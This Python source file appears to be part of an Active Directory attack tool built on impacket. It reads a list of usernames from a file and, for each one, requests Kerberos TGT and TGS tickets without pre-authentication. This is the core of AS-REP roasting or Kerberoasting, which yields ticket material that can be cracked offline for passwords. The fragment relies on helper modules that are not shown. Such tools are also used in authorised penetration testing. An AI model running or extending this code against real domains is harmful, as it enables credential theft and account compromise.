from queue import Queue
import time as t
from multiprocessing.dummy import Pool as ThreadPool
import argparse
from impacket import version
from impacket.examples import logger
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, SessionKeyDecryptionError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ldap import ldap, ldapasn1, ldaptypes
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from utils.adconn import LdapConn
from utils.tickets import TGT, TGS




def build_queue(file:str) -> Queue:
    objs = open(file, 'r').readlines()
    q = Queue()
    for obj in objs:
        obj = obj.strip()
        q.put(obj)
    return q



def get_user(user, domain, dc):
    T = TGT(domain, user, dc, preauth=False)
    tgt_data = T.run()
    tgt = tgt_data['tgt']
    cipher = tgt_data['cipher']
    old = tgt_data['oldSessionKey']
    new = tgt_data['newSessionKey']
    TS = TGS(tgt, domain, cipher, old, new, user, dc, preauth=False)
    tgs = TS.run()
    return tgs